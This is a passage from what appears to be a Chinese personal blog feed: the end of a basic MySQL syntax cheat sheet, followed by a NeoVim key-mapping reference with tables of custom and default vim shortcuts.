<h2 id="修改表名"><a href="#修改表名" class="headerlink" title="修改表名"></a>修改表名</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> 旧表名 <span class="keyword">RENAME</span> [<span class="keyword">TO</span>] 新表名;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>RENAME</code> : 改名</li>
</ul>
<h2 id="更改表的存储引擎"><a href="#更改表的存储引擎" class="headerlink" title="更改表的存储引擎"></a>更改表的存储引擎</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> 表名 <span class="keyword">ENGINE</span>=存储引擎名;</span><br></pre></td></tr></table></figure>
<h2 id="查询表"><a href="#查询表" class="headerlink" title="查询表"></a>查询表</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> <span class="keyword">TABLES</span>;</span><br></pre></td></tr></table></figure>
<h1 id="字段基础操作"><a href="#字段基础操作" class="headerlink" title="字段基础操作"></a>字段基础操作</h1><h2 id="增加字段"><a href="#增加字段" class="headerlink" title="增加字段"></a>增加字段</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> 表名 <span class="keyword">ADD</span> 字段名<span class="number">1</span> 数据类型 [完整约束条件] [<span class="keyword">FIRST</span> | <span class="keyword">AFTER</span> 字段名<span class="number">2</span>];</span><br></pre></td></tr></table></figure>
<ul>
<li><code>FIRST</code> : 首</li>
<li><code>AFTER</code> : 后</li>
</ul>
<h2 id="删除字段"><a href="#删除字段" class="headerlink" title="删除字段"></a>删除字段</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> 表名 <span class="keyword">DROP</span> 字段名;</span><br></pre></td></tr></table></figure>
<h2 id="修改字段的数据类型"><a href="#修改字段的数据类型" class="headerlink" title="修改字段的数据类型"></a>修改字段的数据类型</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> 表名 <span class="keyword">MODIFY</span> 字段名 数据名;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>MODIFY</code> : 变更</li>
</ul>
<h2 id="修改字段名及数据类型"><a href="#修改字段名及数据类型" class="headerlink" title="修改字段名及数据类型"></a>修改字段名及数据类型</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> 表名 <span class="keyword">CHANGE</span> 旧字段名 新字段名 新数据类型;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>CHANGE</code> : 改变</li>
</ul>
<h2 id="查看表结构-字段信息"><a href="#查看表结构-字段信息" class="headerlink" title="查看表结构(字段信息)"></a>查看表结构(字段信息)</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">DESCRIBE</span> 表名;</span><br><span class="line">DESC 表名;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>DESCRIBE</code> : 描述</li>
</ul>
<h2 id="查看表详细结构-详细字段信息"><a href="#查看表详细结构-详细字段信息" class="headerlink" title="查看表详细结构(详细字段信息)"></a>查看表详细结构(详细字段信息)</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> <span class="keyword">FULL</span> <span class="keyword">COLUMNS</span> <span class="keyword">FROM</span> 表名;</span><br><span class="line"><span class="keyword">SHOW</span> <span class="keyword">CREATE</span> <span class="keyword">TABLE</span> 表名\G;</span><br></pre></td></tr></table></figure>
<h1 id="数据-记录-基本操作"><a href="#数据-记录-基本操作" class="headerlink" title="数据 (记录) 基本操作"></a>数据 (记录) 基本操作</h1><h2 id="插入数据"><a href="#插入数据" class="headerlink" title="插入数据"></a>插入数据</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> 表名(字段<span class="number">1</span>,字段<span class="number">2</span>,...) <span class="keyword">VALUES</span> (值<span class="number">1</span>,值<span class="number">2</span>,...)</span><br></pre></td></tr></table></figure>
<p><strong>省略字段清单:</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">START</span> <span class="keyword">TRANSACTION</span>;</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> 表名 <span class="keyword">VALUES</span> (值<span class="number">1</span>,值<span class="number">2</span>,...);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> 表名 <span class="keyword">VALUES</span> (值<span class="number">1</span>,值<span class="number">2</span>,...);</span><br><span class="line">...</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> 表名 <span class="keyword">VALUES</span> (值<span class="number">1</span>,值<span class="number">2</span>,...);</span><br><span class="line"><span class="keyword">COMMIT</span>;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>START</code> : 开始</li>
<li><code>TRANSACTION</code> : 处理</li>
<li><code>COMMIT</code> : 提交</li>
</ul>
<h2 id="删除数据"><a href="#删除数据" class="headerlink" title="删除数据"></a>删除数据</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">DELETE</span> <span class="keyword">FROM</span> 表名 [<span class="keyword">WHERE</span> 条件<span class="number">1</span> [<span class="keyword">AND</span>|<span class="keyword">OR</span> 条件<span class="number">2</span> ...]]</span><br></pre></td></tr></table></figure>
<ul>
<li><code>WHERE</code> : 何处</li>
</ul>
<p><strong>若未指定 <code>WHERE</code> 语句，将删除所有记录</strong></p>
<h2 id="修改数据"><a href="#修改数据" class="headerlink" title="修改数据"></a>修改数据</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> 表名 <span class="keyword">SET</span> 字段<span class="number">1</span>=新值<span class="number">1</span>, 字段<span class="number">2</span>=新值<span class="number">2</span>,... [<span class="keyword">WHERE</span> 条件]</span><br></pre></td></tr></table></figure>
<h2 id="查询数据"><a href="#查询数据" class="headerlink" title="查询数据"></a>查询数据</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> 字段<span class="number">1</span>,字段<span class="number">2</span>,... <span class="keyword">FROM</span> 表<span class="number">1</span>,表<span class="number">2.</span>.. [<span class="keyword">WHERE</span> 条件] [<span class="keyword">LIMIT</span> N][<span class="keyword">OFFSET</span> M]</span><br></pre></td></tr></table></figure>
<p>查询所有字段数据</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> 表名;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>LIMIT</code> : 限制</li>
<li><code>OFFSET</code> : 偏移</li>
</ul>
<h1 id="子句"><a href="#子句" class="headerlink" title="子句"></a>子句</h1><h2 id="WHERE-子句"><a href="#WHERE-子句" class="headerlink" title="WHERE 子句"></a><code>WHERE</code> 子句</h2><p>根据条件选取表中的数据</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> 字段<span class="number">1</span>,字段<span class="number">2</span>,...,字段 <span class="keyword">FROM</span> N表<span class="number">1</span>,表<span class="number">2</span>,... [<span class="keyword">WHERE</span> 条件<span class="number">1</span> [<span class="keyword">AND</span>|<span class="keyword">OR</span>] 条件<span class="number">2</span> ...] </span><br></pre></td></tr></table></figure>
<h2 id="LIKE-子句"><a href="#LIKE-子句" class="headerlink" title="LIKE 子句"></a><code>LIKE</code> 子句</h2><p>WHERE 子句中可用等号 <code>=</code> 决定获取数据的条件 (<code>字段=某值</code>) ，当需要获取含有<code>某字符</code>的所有数据时就需要用到统配符 <code>%</code> ，这时就需要 <code>LIKE</code> 语句来代替等号 <code>=</code> 用于匹配获取数据,如需要含有 <code>COM</code> 的数据时可用 <code>LIKE %COM%</code> 。若没有使用 <code>%</code> ,LIKE 子句与 <code>=</code> 效果形同。</p>
<h1 id="高级操作"><a href="#高级操作" class="headerlink" title="高级操作"></a>高级操作</h1><h2 id="UNION-操作符"><a href="#UNION-操作符" class="headerlink" title="UNION 操作符"></a><code>UNION</code> 操作符</h2><p>用于连接两个以上的 <code>SELECT</code> 语句的结果组合到一个结果集合中，多个 <code>SELECT</code> 语句会删除重复的数据。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> 字段<span class="number">1</span>,字段<span class="number">2.</span>..</span><br><span class="line"><span class="keyword">FROM</span> 表<span class="number">1</span></span><br><span class="line">[<span class="keyword">WHERE</span> 条件]</span><br><span class="line"><span class="keyword">UNION</span> [<span class="keyword">ALL</span> | <span class="keyword">DISTINCT</span>]</span><br><span class="line"><span class="keyword">SELECT</span> 字段</span><br><span class="line"><span class="keyword">FROM</span> 表<span class="number">2</span></span><br><span class="line">[<span class="keyword">WHERE</span> 条件];</span><br></pre></td></tr></table></figure>
<ul>
<li><code>ALL</code> : 全部  返回所有结果，不过滤重复数据</li>
<li><code>DISTINCT</code> : 清晰  删除结果中重复的数据，<code>UNION</code> 默认已经删除重复数据，所有 <code>DISTINCT</code> 对结果没有影响</li>
</ul>
<p><code>DISTINCT</code> 的其他应用</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span> 字段名 <span class="keyword">FROM</span> 表名;</span><br></pre></td></tr></table></figure>
<h2 id="排序"><a href="#排序" class="headerlink" title="排序"></a>排序</h2><p>使用 <code>ORDER BY</code> 子句进行排序。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> 字段<span class="number">1</span>,字段<span class="number">2.</span>.. <span class="keyword">FROM</span> 表名<span class="number">1</span>,表名<span class="number">2.</span>..</span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> 字段<span class="number">1</span> [<span class="keyword">ASC</span>|<span class="keyword">DESC</span>] [,字段<span class="number">2</span>  <span class="keyword">ASC</span>|<span class="keyword">DESC</span> ...]</span><br></pre></td></tr></table></figure>
<ul>
<li><code>ORDER</code> : 顺序</li>
<li><code>ASC</code> : (asend) 上升  升序，<strong>默认使用</strong></li>
<li><code>DESC</code> : (descend) 下降  降序</li>
</ul>
<h2 id="分组"><a href="#分组" class="headerlink" title="分组"></a>分组</h2><p>使用 <code>GROUP BY</code> 根据一个或多个字段对结果进行分组</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> 字段名, 函数(字段名)</span><br><span class="line"><span class="keyword">FROM</span> 表名</span><br><span class="line"><span class="keyword">WHERE</span> 条件</span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span> 字段名;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>GROUP</code> : 组</li>
</ul>
<p>使用 <code>COUNT</code>,<code>SUM</code>,<code>AVG</code> 等函数</p>
<p><a href="https://www.runoob.com/mysql/mysql-group-by-statement.html"><code>WITH ROLLUP</code> 可以实现在分组统计数据基础上再进行相同的统计（SUM,AVG,COUNT…）</a></p>
<h2 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h2><h3 id="显示时间"><a href="#显示时间" class="headerlink" title="显示时间"></a>显示时间</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">NOW()</span><br></pre></td></tr></table></figure>
<h3 id="字符长度"><a href="#字符长度" class="headerlink" title="字符长度"></a>字符长度</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">CHAR_LENGTH(&#x27;XXXXX&#x27;)</span><br></pre></td></tr></table></figure>
<ul>
<li><code>LENGTH</code> : 长度</li>
</ul>
<h3 id="日期格式"><a href="#日期格式" class="headerlink" title="日期格式"></a>日期格式</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">DAT_FORMAT(NOW(),%y-%m-%d)</span><br></pre></td></tr></table></figure>
<ul>
<li><code>FORMAT</code> : 格式</li>
</ul>
<blockquote>
<p><code>%y</code> : 年(2位)<br><code>%Y</code> : 年(4位)<br><code>%m</code> : 月<br><code>%d</code> : 日<br><code>%H</code> : 小时<br><code>%i</code> : 分钟<br><code>%s</code> : 秒</p>
</blockquote>
<h3 id="添加-减少日期时间"><a href="#添加-减少日期时间" class="headerlink" title="添加/减少日期时间"></a>添加/减少日期时间</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">DATE_ADD(时间,INTERVAL 值 单位)</span><br><span class="line">DATE_SUB(时间,INTERVAL 值 单位)</span><br></pre></td></tr></table></figure>
<p>列:</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">DATE_ADD</span>(<span class="keyword">NOW</span>(),<span class="built_in">INTERVAL</span> <span class="number">1</span> <span class="keyword">day</span>);</span><br></pre></td></tr></table></figure>
<ul>
<li><p><code>INTERVAL</code> : 间隔</p>
</li>
<li><p>单位:</p>
<ul>
<li><code>microsecond</code> 毫秒</li>
<li><code>second</code> 秒</li>
<li><code>hour</code> 小时</li>
<li><code>day</code> 天</li>
<li><code>week</code> 周</li>
<li><code>year</code> 年</li>
</ul>
</li>
</ul>
<h3 id="类型转换"><a href="#类型转换" class="headerlink" title="类型转换"></a>类型转换</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">CAST(值 AS 类型B)</span><br></pre></td></tr></table></figure>
<p>例:</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">CAST</span>(<span class="number">12222232</span> <span class="keyword">AS</span> <span class="built_in">CHAR</span>);</span><br></pre></td></tr></table></figure>
<h3 id="加密函数"><a href="#加密函数" class="headerlink" title="加密函数"></a>加密函数</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">MD5()</span><br><span class="line">DES_ENCRYPT(加密)</span><br><span class="line">DES_DECRYPT(解密)</span><br><span class="line">SHA1()</span><br><span class="line">PASSWORD()</span><br></pre></td></tr></table></figure>
<h3 id="字符串连接"><a href="#字符串连接" class="headerlink" title="字符串连接"></a>字符串连接</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">CONCAT(str1,str2,str3)</span><br></pre></td></tr></table></figure>
<h3 id="转换-JSON-字符串"><a href="#转换-JSON-字符串" class="headerlink" title="转换 JSON 字符串"></a>转换 JSON 字符串</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">JSON_OBJECT()</span><br></pre></td></tr></table></figure>
<h3 id="聚合函数"><a href="#聚合函数" class="headerlink" title="聚合函数"></a>聚合函数</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">SUM()  <span class="comment"># 求和</span></span><br><span class="line">COUNT() <span class="comment"># 统计</span></span><br><span class="line">AVG() <span class="comment"># 求平均值</span></span><br><span class="line">MAX() <span class="comment"># 最大</span></span><br><span class="line">MIN() <span class="comment"># 最小</span></span><br></pre></td></tr></table></figure>
<h3 id="去重"><a href="#去重" class="headerlink" title="去重"></a>去重</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">DISTINCT()</span><br></pre></td></tr></table></figure>
<h1 id="查考"><a href="#查考" class="headerlink" title="查考"></a>查考</h1><p><a href="https://www.runoob.com/mysql/mysql-tutorial.html">MySQL 教程-菜鸟教程</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/52428930">SQL入门？只要记住这些基础语句就够了！</a></p>
<p><a href="https://juejin.cn/post/6844903544160681992">十个实用MySQL函数</a></p>
]]></content>
      <categories>
        <category>SQL</category>
      </categories>
      <tags>
        <tag>SQL</tag>
      </tags>
  </entry>
  <entry>
    <title>NeoVim键盘隐射</title>
    <url>/posts/7e119494/</url>
    <content><![CDATA[<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">                              _ ____</span><br><span class="line">  ___  ___  _ __  _   _ _ __ ( ) ___|</span><br><span class="line"> / _ \/ _ \| <span class="string">&#x27;_ \| | | | &#x27;</span>_ \|/\___ \</span><br><span class="line">|  __/ (_) | | | | |_| | | | |  ___) |</span><br><span class="line"> \___|\___/|_| |_|\__,_|_| |_| |____/</span><br><span class="line"></span><br><span class="line"> _   ___     ___           __  __</span><br><span class="line">| \ | \ \   / (_)_ __ ___ |  \/  | __ _ _ __</span><br><span class="line">|  \| |\ \ / /| | <span class="string">&#x27;_ ` _ \| |\/| |/ _` | &#x27;</span>_ \</span><br><span class="line">| |\  | \ V / | | | | | | | |  | | (_| | |_) |</span><br><span class="line">|_| \_|  \_/  |_|_| |_| |_|_|  |_|\__,_| .__/</span><br><span class="line">                                       |_|</span><br><span class="line"></span><br><span class="line">==============木He寸&amp;eonun===================</span><br></pre></td></tr></table></figure>
<a id="more"></a>
<h1 id="普通视图"><a href="#普通视图" class="headerlink" title="普通视图"></a>普通视图</h1><h2 id="控制"><a href="#控制" class="headerlink" title="控制"></a>控制</h2><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">按键</th>
<th style="text-align:left">映射键</th>
<th style="text-align:left">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>J</code></td>
<td style="text-align:left"><code>5j</code></td>
<td style="text-align:left">下5</td>
</tr>
<tr>
<td style="text-align:left"><code>K</code></td>
<td style="text-align:left"><code>5k</code></td>
<td style="text-align:left">上5</td>
</tr>
<tr>
<td style="text-align:left"><code>&lt;LEADER&gt;&lt;CR&gt;</code></td>
<td style="text-align:left"><code>:nohlsearch&lt;CR&gt;</code></td>
<td style="text-align:left">快捷取消搜索高亮</td>
</tr>
<tr>
<td style="text-align:left"><code>MR</code></td>
<td style="text-align:left"><code>:w $MYVIMRC&lt;CR&gt;</code></td>
<td style="text-align:left">打开vimrc</td>
</tr>
<tr>
<td style="text-align:left"><code>s</code></td>
<td style="text-align:left"><code>&lt;nop&gt;</code></td>
<td style="text-align:left">空</td>
</tr>
<tr>
<td style="text-align:left"><code>S</code></td>
<td style="text-align:left"><code>:w&lt;CR&gt;</code></td>
<td style="text-align:left">保存</td>
</tr>
<tr>
<td style="text-align:left"><code>Q</code></td>
<td style="text-align:left"><code>:q&lt;CR&gt;</code></td>
<td style="text-align:left">退出</td>
</tr>
<tr>
<td style="text-align:left"><code>Y</code></td>
<td style="text-align:left"><code>:w !xclip -i -sel c &lt;CR&gt;</code></td>
<td style="text-align:left">选中行复制到系统剪切板（需安装xclip）</td>
</tr>
<tr>
<td style="text-align:left"><code>Y</code></td>
<td style="text-align:left"><code>&quot;+y</code></td>
<td style="text-align:left">复制到系统剪切板（安装gvim）</td>
</tr>
<tr>
<td style="text-align:left"><code>Ctrl+A</code></td>
<td style="text-align:left"><code>&lt;silent&gt; &lt;C-a&gt; ggvG</code></td>
<td style="text-align:left">全选</td>
</tr>
</tbody>
</table>
</div>
<h2 id="分屏"><a href="#分屏" class="headerlink" title="分屏"></a>分屏</h2><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">按键</th>
<th style="text-align:left">映射键</th>
<th style="text-align:left">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>&lt;LEADER&gt;s</code></td>
<td style="text-align:left"><code>:e&lt;Space&gt;</code></td>
<td style="text-align:left">打开新文件，需补全路径</td>
</tr>
<tr>
<td style="text-align:left"><code>sk</code></td>
<td style="text-align:left"><code>:set splitbelow&lt;CR&gt;:split&lt;CR&gt;</code></td>
<td style="text-align:left">上分屏</td>
</tr>
<tr>
<td style="text-align:left"><code>sj</code></td>
<td style="text-align:left"><code>:set nosplitbelow&lt;CR&gt;:split&lt;CR&gt;</code></td>
<td style="text-align:left">下分屏</td>
</tr>
<tr>
<td style="text-align:left"><code>sh</code></td>
<td style="text-align:left"><code>:set splitright&lt;CR&gt;:vsplit&lt;CR&gt;</code></td>
<td style="text-align:left">左分屏</td>
</tr>
<tr>
<td style="text-align:left"><code>sl</code></td>
<td style="text-align:left"><code>:set nosplitright&lt;CR&gt;:vsplit&lt;CR&gt;</code></td>
<td style="text-align:left">右分屏</td>
</tr>
<tr>
<td style="text-align:left"><code>sz</code></td>
<td style="text-align:left"><code>&lt;C-w&gt;t&lt;C-w&gt;H</code></td>
<td style="text-align:left">竖向分屏换左右分屏</td>
</tr>
<tr>
<td style="text-align:left"><code>ss</code></td>
<td style="text-align:left"><code>&lt;C-w&gt;t&lt;C-w&gt;K</code></td>
<td style="text-align:left">左右分屏换竖向分屏</td>
</tr>
<tr>
<td style="text-align:left"><code>&lt;LEADER&gt;k</code></td>
<td style="text-align:left"><code>&lt;C-w&gt;k</code></td>
<td style="text-align:left">光标到上屏</td>
</tr>
<tr>
<td style="text-align:left"><code>&lt;LEADER&gt;j</code></td>
<td style="text-align:left"><code>&lt;C-w&gt;j</code></td>
<td style="text-align:left">光标到下屏</td>
</tr>
<tr>
<td style="text-align:left"><code>&lt;LEADER&gt;h</code></td>
<td style="text-align:left"><code>&lt;C-w&gt;h</code></td>
<td style="text-align:left">光标到左屏</td>
</tr>
<tr>
<td style="text-align:left"><code>&lt;LEADER&gt;l</code></td>
<td style="text-align:left"><code>&lt;C-w&gt;l</code></td>
<td style="text-align:left">光标到右屏</td>
</tr>
<tr>
<td style="text-align:left"><code>&lt;up&gt;</code></td>
<td style="text-align:left"><code>:res +5&lt;CR&gt;</code></td>
<td style="text-align:left">分屏线上移</td>
</tr>
<tr>
<td style="text-align:left"><code>&lt;down&gt;</code></td>
<td style="text-align:left"><code>:res -5&lt;CR&gt;</code></td>
<td style="text-align:left">分屏线下移</td>
</tr>
<tr>
<td style="text-align:left"><code>&lt;left&gt;</code></td>
<td style="text-align:left"><code>:vertical resize+5&lt;CR&gt;</code></td>
<td style="text-align:left">分屏线左移</td>
</tr>
<tr>
<td style="text-align:left"><code>&lt;right&gt;</code></td>
<td style="text-align:left"><code>:vertical resize-5&lt;CR&gt;</code></td>
<td style="text-align:left">分屏线右移</td>
</tr>
</tbody>
</table>
</div>
<h2 id="选项卡"><a href="#选项卡" class="headerlink" title="选项卡"></a>选项卡</h2><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">按键</th>
<th style="text-align:left">映射键</th>
<th style="text-align:left">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>tn</code></td>
<td style="text-align:left"><code>:tabe&lt;CR&gt;</code></td>
<td style="text-align:left">打开新选项卡</td>
</tr>
<tr>
<td style="text-align:left"><code>th</code></td>
<td style="text-align:left"><code>:-tabnext&lt;CR&gt;</code></td>
<td style="text-align:left">到左边的选项卡</td>
</tr>
<tr>
<td style="text-align:left"><code>tl</code></td>
<td style="text-align:left"><code>:+tabnext&lt;CR&gt;</code></td>
<td style="text-align:left">到右边的选项卡</td>
</tr>
</tbody>
</table>
</div>
<h2 id="主题"><a href="#主题" class="headerlink" title="主题"></a>主题</h2><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">按键</th>
<th style="text-align:left">映射键</th>
<th style="text-align:left">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>&lt;LEADER&gt;c1</code></td>
<td style="text-align:left"><code>:set background=dark&lt;CR&gt;:colorscheme solarized8&lt;CR&gt;:AirlineTheme jellybeans&lt;CR&gt;</code></td>
<td style="text-align:left">配色1</td>
</tr>
<tr>
<td style="text-align:left"><code>&lt;LEADER&gt;c2</code></td>
<td style="text-align:left"><code>:set background=light&lt;CR&gt;:let ayucolor=&#39;light&#39;&lt;CR&gt;:colorscheme ayu&lt;CR&gt;:AirlineTheme ayu_light&lt;CR&gt;</code></td>
<td style="text-align:left">配色2</td>
</tr>
</tbody>
</table>
</div>
<h2 id="插件"><a href="#插件" class="headerlink" title="插件"></a>插件</h2><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">按键</th>
<th style="text-align:left">映射键</th>
<th style="text-align:left">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>F3</code></td>
<td style="text-align:left"><code>:NERDTreeToggle&lt;CR&gt;</code></td>
<td style="text-align:left">设置目录树快捷键</td>
</tr>
<tr>
<td style="text-align:left"><code>Ctrl+p</code></td>
<td style="text-align:left"><code>map &lt;C-p&gt; :CtrlP&lt;CR&gt;</code></td>
<td style="text-align:left">打开项目文件浏览</td>
</tr>
<tr>
<td style="text-align:left"><code>Ctrl+d</code></td>
<td style="text-align:left"><code>:set cmdheight=2&lt;CR&gt;</code></td>
<td style="text-align:left">修改命令行行数</td>
</tr>
<tr>
<td style="text-align:left"><code>Ctrl+t</code></td>
<td style="text-align:left"><code>:set cmdheight=10&lt;CR&gt;</code></td>
<td style="text-align:left">修改命令行行数</td>
</tr>
<tr>
<td style="text-align:left"><code>TAB</code></td>
<td style="text-align:left"></td>
<td style="text-align:left">补全</td>
</tr>
<tr>
<td style="text-align:left"><code>&lt;LEADER&gt;l</code></td>
<td style="text-align:left"><code>:UndotreeToggle&lt;CR&gt;</code></td>
<td style="text-align:left">文件历史</td>
</tr>
<tr>
<td style="text-align:left"><code>F8</code></td>
<td style="text-align:left"><code>&lt;Plug&gt;MarkdownPreview</code></td>
<td style="text-align:left">浏览Markdown</td>
</tr>
<tr>
<td style="text-align:left"><code>F9</code></td>
<td style="text-align:left"><code>&lt;Plug&gt;MarkdownPreviewStop</code></td>
<td style="text-align:left">关闭Markdown浏览</td>
</tr>
<tr>
<td style="text-align:left"><code>&lt;LEADER&gt;mt</code></td>
<td style="text-align:left"><code>&lt;Plug&gt;MarkdownPreviewToggle</code></td>
<td style="text-align:left">开关Markdown预览</td>
</tr>
<tr>
<td style="text-align:left"><code>&lt;LEADER&gt;tm</code></td>
<td style="text-align:left"><code>:TableModeToggle&lt;CR&gt;</code></td>
<td style="text-align:left">制表工具</td>
</tr>
<tr>
<td style="text-align:left"><code>&lt;LEADER&gt;cn</code></td>
<td style="text-align:left"></td>
<td style="text-align:left">注释所选行</td>
</tr>
<tr>
<td style="text-align:left"><code>&lt;LEADER&gt;cu</code></td>
<td style="text-align:left"></td>
<td style="text-align:left">取消所选行注释</td>
</tr>
<tr>
<td style="text-align:left"><code>cs&quot;&#39;</code></td>
<td style="text-align:left"></td>
<td style="text-align:left">替换<code>&quot;</code>为<code>‘</code>（其他类推,html标签为<code>t</code>）</td>
</tr>
<tr>
<td style="text-align:left"><code>ds&quot;</code></td>
<td style="text-align:left"></td>
<td style="text-align:left">删除<code>&quot;</code> （其他类推,html标签为<code>t</code>）</td>
</tr>
<tr>
<td style="text-align:left"><code>ysiw]</code></td>
<td style="text-align:left"></td>
<td style="text-align:left">给单词加<code>]</code> （其他类推,html标签为<code>t</code>）</td>
</tr>
<tr>
<td style="text-align:left"><code>yss)</code></td>
<td style="text-align:left"></td>
<td style="text-align:left">给整行加<code>)</code> （其他类推,html标签为<code>t</code>）</td>
</tr>
<tr>
<td style="text-align:left"><code>ysiw&lt;em&gt;</code></td>
<td style="text-align:left"></td>
<td style="text-align:left">给单词加<code>&lt;em&gt;&lt;/em&gt;</code>（其他类推）</td>
</tr>
</tbody>
</table>
</div>
<h2 id="vim默认快捷键"><a href="#vim默认快捷键" class="headerlink" title="vim默认快捷键"></a>vim默认快捷键</h2><h3 id="控制光标"><a href="#控制光标" class="headerlink" title="控制光标"></a>控制光标</h3><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">快捷键</th>
<th style="text-align:left">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>h</code></td>
<td style="text-align:left">光标向左移动一个字符</td>
</tr>
<tr>
<td style="text-align:left"><code>j</code> 或 <code>Ctrl + J</code></td>
<td style="text-align:left">光标向下移动一行</td>
</tr>
<tr>
<td style="text-align:left"><code>k</code> 或 <code>Ctrl + P</code></td>
<td style="text-align:left">光标向上移动一行</td>
</tr>
<tr>
<td style="text-align:left"><code>l</code></td>
<td style="text-align:left">光标向右移动一个字符</td>
</tr>
<tr>
<td style="text-align:left"><code>0</code></td>
<td style="text-align:left">（数字 0）移动光标至本行开头</td>
</tr>
<tr>
<td style="text-align:left"><code>$</code></td>
<td style="text-align:left">移动光标至本行末尾</td>
</tr>
<tr>
<td style="text-align:left"><code>^</code></td>
<td style="text-align:left">移动光标至本行第一个非空字符处</td>
</tr>
<tr>
<td style="text-align:left"><code>w</code></td>
<td style="text-align:left">向前移动一个词 （上一个字母和数字组成的词之后）</td>
</tr>
<tr>
<td style="text-align:left"><code>W</code></td>
<td style="text-align:left">向前移动一个词 （以空格分隔的词）</td>
</tr>
<tr>
<td style="text-align:left"><code>5w</code></td>
<td style="text-align:left">向前移动五个词</td>
</tr>
<tr>
<td style="text-align:left"><code>b</code></td>
<td style="text-align:left">向后移动一个词 （下一个字母和数字组成的词之前）</td>
</tr>
<tr>
<td style="text-align:left"><code>B</code></td>
<td style="text-align:left">向后移动一个词 （以空格分隔的词）</td>
</tr>
<tr>
<td style="text-align:left"><code>5b</code></td>
<td style="text-align:left">向后移动五个词</td>
</tr>
<tr>
<td style="text-align:left"><code>G</code></td>
<td style="text-align:left">移动至文件末尾</td>
</tr>
<tr>
<td style="text-align:left"><code>gg</code></td>
<td style="text-align:left">移动至文件开头</td>
</tr>
</tbody>
</table>
</div>
<h3 id="文档预览"><a href="#文档预览" class="headerlink" title="文档预览"></a>文档预览</h3><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">快捷键</th>
<th style="text-align:left">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>(</code></td>
<td style="text-align:left">跳转到上一句</td>
</tr>
<tr>
<td style="text-align:left"><code>)</code></td>
<td style="text-align:left">跳转到下一句</td>
</tr>
<tr>
<td style="text-align:left"><code>&#123;</code></td>
<td style="text-align:left">跳转到上一段</td>
</tr>
<tr>
